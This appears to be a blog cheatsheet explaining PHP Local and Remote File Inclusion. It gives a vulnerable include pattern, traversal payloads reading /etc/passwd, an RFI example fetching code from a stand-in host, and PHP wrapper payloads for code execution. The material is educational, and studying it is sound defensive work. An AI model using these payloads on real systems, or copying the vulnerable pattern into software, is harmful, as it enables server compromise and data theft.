---
layout: post
title: "File Inclusions"
date: 2023-08-20
categories: [CHEATSHEET]
---

## Local File Inclusion (LFI)  

Attackers manipulate parameters to access files on the server, such as using `?page=../../etc/passwd` in a URL.

### Typical Vulnerable Code Patterns  


Common in PHP with `include()` or `require()` functions.

```php
$file = $_GET['file'];
include($file);
```

### Exploitation Techniques  


* **Basic LFI**: Direct file referencing, e.g., `?file=../../../../etc/passwd`.
* **Null Byte Injection**: Using `%00` or null byte in older PHP versions to bypass checks.
* **PHP Wrappers**: Utilizing PHP streams like `php://filter` for code execution or file disclosure.
* **Log Poisoning**: Injecting code into logs and including the log file to execute code.


> ***Note:***
>
> On Windows, directory structures might differ, and log files are located in application-specific paths.



## Remote File Inclusion (RFI)   

RFIis a type of vulnerability that allows an attacker to include and execute remotely hosted files within a web application. 

* Occurs when a web application dynamically includes external files or scripts from remote servers.
* Attackers manipulate input (e.g., URL parameters) to point to external malicious files, leading to execution of the attacker-controlled code on the server, For example, `?file=http://example.com/malicious_code.php`.
* **Wrapper Techniques**: Similar to LFI, attackers might use PHP wrappers (`php://input`, `data://`) in conjunction with RFI to bypass filters or execute non-standard payloads.
* **Filter Evasion**: Employing encoding or obfuscation to slip malicious payloads past input validation mechanisms.

> ***Note:***
>
> you can find webshells in kali linux under `/usr/share/webshells/` , choose one of them and expose it via a python webserver to test it out.


## PHP Wrappers  


**PHP Wrappers** are powerful tools in PHP that modify how file operations are handled, often exploited in LFI attacks to execute or disclose code.

#### Common PHP Wrappers and Usage Examples  


* **php://filter**: Converts file data through filters. Attackers use it to read PHP files in base64 encoding.
  * Example: `include('php://filter/read=convert.base64-encode/resource=index.php');`
* **php://input**: Reads raw data from the request body, used to execute code by including `php://input` and sending code in the request body.
  * Example: `include('php://input');` and POSTing PHP code.
* **php://memory** and **php://temp**: Allow access to read/write temporary data streams. Can be used to execute transient code that doesn't leave traces on the disk.
* **data://**: Allows inclusion of inline data. Can be exploited to execute arbitrary data as code.
  * Example: `include('data://text/plain;base64,SGVsbG8sIFdvcmxkIQ==');`
